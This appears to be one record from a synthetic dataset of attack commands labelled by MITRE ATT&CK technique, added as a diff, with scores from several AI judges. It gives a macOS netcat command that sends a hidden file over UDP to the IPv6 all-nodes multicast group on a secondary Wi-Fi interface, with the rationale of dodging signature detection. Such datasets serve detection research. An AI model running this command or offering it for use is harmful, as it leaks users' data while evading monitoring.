@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr llw0)\" \"ff02::1%llw0\" 54901 < /tmp/.z",
+  "explanation": "Uses the low-latency Wi‑Fi interface (llw0) to transmit to the all-nodes IPv6 multicast group on a high, uncommon UDP port, exploiting a secondary wireless medium per T1011.",
+  "rationale_steps": [
+    "Query ipconfig for the IPv6 address on llw0 to ensure traffic egresses over the low-latency Wi‑Fi medium.",
+    "Bind the sender to that address and target a link-local multicast scope.",
+    "Transmit data over an uncommon UDP port to minimize signature-based detection."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-63e108fb",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting with valid nc flags and well-formed command substitution and input redirection.",
+        "semantic_score": 3,
+        "semantic_justification": "It plausibly sends /tmp/.z via UDP IPv6 to the all-nodes multicast on llw0 if available, but it is not automated as per the stated technique and depends on a rarely accessible interface and link-local multicast scope.",
+        "combined_score": 4.0,
+        "confidence": 0.6,
+        "timestamp": "2025-10-01T02:19:14.175534Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid nc flags, and correct command structure for redirecting file content.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with T1011 by exfiltrating data from a hidden file (/tmp/.z) over a wireless interface to all IPv6 nodes on the local network segment, though it lacks encryption or compression typically seen in sophisticated exfiltration.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:19:17.457805Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with valid flags, balanced quotes, and correct command substitution for a Bash shell on macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the claimed intent, using appropriate tools and arguments to perform automated IPv6 UDP multicast exfiltration from a specified interface, fitting the T1011 technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:19:28.043367Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
